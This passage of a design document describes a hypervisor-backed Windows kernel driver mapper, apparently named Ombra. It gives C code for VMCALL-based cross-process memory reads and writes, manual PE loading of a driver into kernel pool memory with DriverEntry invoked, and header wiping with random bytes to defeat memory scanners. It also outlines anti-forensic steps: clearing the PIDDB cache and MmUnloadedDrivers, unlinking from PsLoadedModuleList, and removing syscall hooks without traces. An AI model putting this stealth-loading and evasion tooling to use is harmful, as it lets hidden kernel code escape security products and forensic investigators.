    cmd.read.pTarget = buffer;

    return ombra_hypercall(VMCALL_READ_VIRT, &cmd, target_cr3);
}

VMX_ROOT_ERROR write_virt(u64 virt_addr, void* buffer, u64 size, u64 target_cr3) {
    COMMAND_DATA cmd = {0};
    cmd.write.length = size;
    cmd.write.pInBuf = buffer;
    cmd.write.pTarget = (void*)virt_addr;

    return ombra_hypercall(VMCALL_WRITE_VIRT, &cmd, target_cr3);
}
```

### Storage Slot Operations

```c
u64 storage_get(u64 slot_id) {
    COMMAND_DATA cmd = {0};
    cmd.storage.bWrite = false;
    cmd.storage.id = slot_id;

    VMX_ROOT_ERROR status = ombra_hypercall(VMCALL_STORAGE_QUERY, &cmd, 0);
    if (status != VMX_ROOT_ERROR::SUCCESS) {
        return 0;
    }

    return cmd.storage.uint64;
}

void storage_set(u64 slot_id, u64 value) {
    COMMAND_DATA cmd = {0};
    cmd.storage.bWrite = true;
    cmd.storage.id = slot_id;
    cmd.storage.uint64 = value;

    ombra_hypercall(VMCALL_STORAGE_QUERY, &cmd, 0);
}
```

---

## C Conversion Notes

### Replacing C++ Features

| C++ Feature | C Replacement |
|-------------|---------------|
| `std::vector<u8>` | Fixed buffer or `u8* + size_t` |
| `std::string` | `char* + strlen()` |
| `std::map` | Manual hashtable or linear search |
| `std::function` | Function pointers |
| Templates | Manual specialization or void* |
| Classes | Structs + function pointers |
| RAII | Manual cleanup via defer pattern |
| Exceptions | Error codes (NTSTATUS) |
| `new/delete` | `malloc/free` or pool allocators |
| `memcpy` | Same in C |
| `strcmp` | Same in C |

### PE Parsing Without Windows Headers

All PE structures must be manually defined. Do NOT include `<winnt.h>` in payload code.

```c
// Define all needed structures:
typedef struct IMAGE_DOS_HEADER { ... } IMAGE_DOS_HEADER;
typedef struct IMAGE_NT_HEADERS64 { ... } IMAGE_NT_HEADERS64;
typedef struct IMAGE_SECTION_HEADER { ... } IMAGE_SECTION_HEADER;
typedef struct IMAGE_DATA_DIRECTORY { ... } IMAGE_DATA_DIRECTORY;
typedef struct IMAGE_IMPORT_DESCRIPTOR { ... } IMAGE_IMPORT_DESCRIPTOR;
typedef struct IMAGE_BASE_RELOCATION { ... } IMAGE_BASE_RELOCATION;
typedef struct IMAGE_EXPORT_DIRECTORY { ... } IMAGE_EXPORT_DIRECTORY;
```

### Manual Import Resolution Table Walking

```c
// No DbgHelp.lib dependency
// No ImageNtHeader(), ImageRvaToVa(), etc.
// All PE parsing is manual pointer arithmetic

IMAGE_NT_HEADERS64* get_nt_headers(u8* image_base) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)image_base;
    if (dos->e_magic != 0x5A4D) return NULL;

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(image_base + dos->e_lfanew);
    if (nt->Signature != 0x4550) return NULL;

    return nt;
}

IMAGE_SECTION_HEADER* get_sections(IMAGE_NT_HEADERS64* nt) {
    return (IMAGE_SECTION_HEADER*)((u8*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
}

void* rva_to_va(u8* image_base, u32 rva) {
    return image_base + rva;
}
```

### Avoiding std::vector for Sections

```c
// Instead of std::vector<IMAGE_SECTION_HEADER>
typedef struct {
    IMAGE_SECTION_HEADER* sections;
    u32 count;
} section_list;

section_list get_sections(u8* image_base, IMAGE_NT_HEADERS64* nt) {
    section_list list;
    list.count = nt->FileHeader.NumberOfSections;
    list.sections = (IMAGE_SECTION_HEADER*)(
        (u8*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader
    );
    return list;
}
```

---

## Critical Offsets and Constants

### Pool Types

```c
#define NonPagedPool 0
#define NonPagedPoolExecute 1
#define PagedPool 2
```

### Relocation Types

```c
#define IMAGE_REL_BASED_ABSOLUTE    0
#define IMAGE_REL_BASED_HIGH        1
#define IMAGE_REL_BASED_LOW         2
#define IMAGE_REL_BASED_HIGHLOW     3
#define IMAGE_REL_BASED_HIGHADJ     4
#define IMAGE_REL_BASED_DIR64       10
```

### PE Magic Numbers

```c
#define IMAGE_DOS_SIGNATURE     0x5A4D  // "MZ"
#define IMAGE_NT_SIGNATURE      0x4550  // "PE\0\0"
#define IMAGE_FILE_MACHINE_AMD64 0x8664
#define IMAGE_NT_OPTIONAL_HDR64_MAGIC 0x020B
```

### Data Directory Indices

```c
#define IMAGE_DIRECTORY_ENTRY_EXPORT    0
#define IMAGE_DIRECTORY_ENTRY_IMPORT    1
#define IMAGE_DIRECTORY_ENTRY_RESOURCE  2
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3
#define IMAGE_DIRECTORY_ENTRY_SECURITY  4
#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5
```

### Section Characteristics

```c
#define IMAGE_SCN_CNT_CODE              0x00000020
#define IMAGE_SCN_CNT_INITIALIZED_DATA  0x00000040
#define IMAGE_SCN_MEM_EXECUTE           0x20000000
#define IMAGE_SCN_MEM_READ              0x40000000
#define IMAGE_SCN_MEM_WRITE             0x80000000
```

### File Characteristics

```c
#define IMAGE_FILE_RELOCS_STRIPPED      0x0001
#define IMAGE_FILE_EXECUTABLE_IMAGE     0x0002
#define IMAGE_FILE_DLL                  0x2000
```

### Page Sizes

```c
#define PAGE_SIZE_4KB   0x1000
#define PAGE_SIZE_2MB   (PAGE_SIZE_4KB * 512)
#define PAGE_SIZE_1GB   (PAGE_SIZE_2MB * 512)
```

---

## Testing Checklist

### PE Parsing
- [ ] DOS header magic validation (0x5A4D)
- [ ] NT header magic validation (0x4550)
- [ ] Section count < 64 (sanity check)
- [ ] Section RVA + size <= SizeOfImage
- [ ] OptionalHeader.Magic == 0x020B (PE32+)

### Relocations
- [ ] Test with driver loaded at preferred base (no relocations)
- [ ] Test with driver at different base (relocations applied)
- [ ] Verify all relocation types (DIR64 most common)
- [ ] Handle stripped relocations gracefully

### Import Resolution
- [ ] Resolve imports from ntoskrnl.exe
- [ ] Resolve imports from hal.dll
- [ ] Handle missing exports gracefully
- [ ] Verify IAT is correctly patched

### Kernel Context
- [ ] Identity mapping initialized before kernel_ctx
- [ ] Syscall hook survives multiple calls
- [ ] Hook restoration leaves no traces
- [ ] Verify syscall works after unhook

### Memory Operations
- [ ] Physical read/write via VMCALL
- [ ] Virtual read/write cross-process
- [ ] Identity mapping covers all physical RAM
- [ ] VA to PA translation matches Windows

### Driver Mapping
- [ ] Driver loads successfully
- [ ] DriverEntry returns STATUS_SUCCESS
- [ ] Driver can allocate pool memory
- [ ] Driver can resolve imports
- [ ] PE headers eliminated post-load

### Anti-Forensics
- [ ] MZ/PE signatures absent after header wipe
- [ ] PIDDB cache cleared
- [ ] MmUnloadedDrivers cleared
- [ ] Driver not in PsLoadedModuleList

---

## Example: Complete Driver Mapping Flow

```c
// Complete end-to-end example
bool map_driver_example(const char* driver_path) {
    // 1. Load driver file
    u8* driver_buffer = NULL;
    u64 driver_size = 0;

    if (!load_file(driver_path, &driver_buffer, &driver_size)) {
        return false;
    }

    // 2. Parse PE
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)driver_buffer;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(driver_buffer + dos->e_lfanew);

    // 3. Allocate mapped image
    u64 image_size = nt->OptionalHeader.SizeOfImage;
    u8* mapped_image = malloc(image_size);
    memset(mapped_image, 0, image_size);

    // 4. Copy headers
    memcpy(mapped_image, driver_buffer, nt->OptionalHeader.SizeOfHeaders);

    // 5. Copy sections
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(
        (u8*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader
    );

    for (u32 i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        u8* dest = mapped_image + sections[i].VirtualAddress;
        u8* src = driver_buffer + sections[i].PointerToRawData;
        memcpy(dest, src, sections[i].SizeOfRawData);
    }

    // 6. Fix imports
    if (!fix_imports(mapped_image, nt, get_kernel_export)) {
        free(mapped_image);
        return false;
    }

    // 7. Allocate kernel pool
    void* pool_base = allocate_pool(image_size, NonPagedPool);
    if (!pool_base) {
        free(mapped_image);
        return false;
    }

    // 8. Process relocations
    if (!process_relocations(mapped_image, nt, pool_base)) {
        free_pool(pool_base);
        free(mapped_image);
        return false;
    }

    // 9. Write to kernel
    write_kernel(pool_base, mapped_image, image_size);

    // 10. Call DriverEntry
    u64 entry_point = (u64)pool_base + nt->OptionalHeader.AddressOfEntryPoint;

    typedef NTSTATUS (*DRIVER_INITIALIZE)(void*, u64);
    NTSTATUS status = kernel_syscall<NTSTATUS>(
        (void*)entry_point,
        pool_base,
        image_size
    );

    // 11. Wipe headers on success
    if (NT_SUCCESS(status)) {
        wipe_driver_headers(pool_base, nt->OptionalHeader.SizeOfHeaders);
    }

    free(mapped_image);
    return NT_SUCCESS(status);
}
```

---

## Performance Considerations

### Memory Allocation Strategies

**Usermode (OmbraLoader):**
- Use `VirtualLock()` to prevent paging
- Align page table structures to 0x1000
- Pre-allocate before entering VMXRoot

**Kernel (OmbraDriver):**
- Use `NonPagedPool` for hypervisor-accessed memory
- Use `PagedPool` for large temporary buffers
- Consider pool tags for debugging

**VMXRoot (PayLoad):**
- Fixed 8MB bump allocator
- No dynamic allocation after init
- All structures pre-sized

### VMCALL Overhead

Each VMCALL costs ~500-1000 cycles. Minimize calls:
- Batch physical memory operations
- Use virtual memory operations when possible
- Cache frequently-accessed values (CR3, storage slots)

### Identity Mapping Coverage

512GB identity mapping covers most systems. For servers with >512GB RAM:
- Use multiple PML4 entries
- Or use manual page table walking

---

## Security Considerations

### Header Elimination

**Importance:** Memory scanners search for PE headers (MZ/PE signatures). The header elimination step uses LCG-based garbage generation to avoid patterns.

```c
// LCG pseudo-random generator
u64 lcg_seed = __rdtsc();

u8 lcg_rand() {
    lcg_seed = lcg_seed * 6364136223846793005ULL + 1442695040888963407ULL;
    lcg_seed ^= (lcg_seed >> 33);
    return (u8)lcg_seed;
}

bool contains_pe_signature(u8* buffer, u64 size) {
    for (u64 i = 0; i < size - 1; i++) {
        if ((buffer[i] == 0x4D && buffer[i+1] == 0x5A) ||  // "MZ"
            (buffer[i] == 0x50 && buffer[i+1] == 0x45)) {  // "PE"
            return true;
        }
    }
    return false;
}

void wipe_driver_headers(void* pool_base, u64 header_size) {
    const u64 CHUNK_SIZE = 0x1000;
    u8 garbage[CHUNK_SIZE];

    for (u64 offset = 0; offset < header_size; offset += CHUNK_SIZE) {
        u64 chunk = min(CHUNK_SIZE, header_size - offset);

        // Generate garbage
        do {
            for (u64 i = 0; i < chunk; i++) {
                garbage[i] = lcg_rand();
            }
        } while (contains_pe_signature(garbage, chunk));

        // Write to kernel
        write_kernel((u8*)pool_base + offset, garbage, chunk);
    }
}
```

### PIDDB Cache Clearing

**PIDDB (Program Inventory Database)** tracks all drivers loaded since boot. Even after unloading, forensic traces remain.

**Location:** `ntoskrnl.exe` global `PiDDBCacheTable` (RTL_AVL_TABLE)

**Clearing Algorithm:**
1. Acquire `PiDDBLock` (ERESOURCE)
2. Search tree for entry matching driver name + timestamp
3. Unlink from LIST_ENTRY
4. Delete from AVL tree
5. Release lock

**Critical:** Pattern signatures for `PiDDBLock` and `PiDDBCacheTable` are Windows version-specific. See `util.hpp` for Windows 10/11 22H2 signatures.

---

**END OF DOCUMENT**
